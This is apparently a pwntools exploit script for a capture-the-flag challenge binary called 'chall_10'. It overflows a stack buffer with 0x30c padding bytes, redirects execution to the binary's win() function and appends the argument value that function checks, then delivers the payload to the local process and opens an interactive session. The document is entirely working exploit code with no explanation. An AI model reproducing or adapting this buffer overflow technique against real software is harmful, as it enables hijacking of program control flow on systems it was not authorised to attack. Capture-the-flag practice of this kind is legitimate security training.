import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_10")

offset = 0x30c # (var char *s @ stack - 0x30c)
payload = b"A" * offset
payload += pwn.p32(elf.sym.win)
payload += pwn.p32(0)
payload += pwn.p32(0x1a55fac3) # value checked in win()

p = pwn.process(elf.path)

output = p.recvuntil(b"why don't they ever make a 128 bit architecture?")
print(output)

p.sendline(payload)

p.interactive()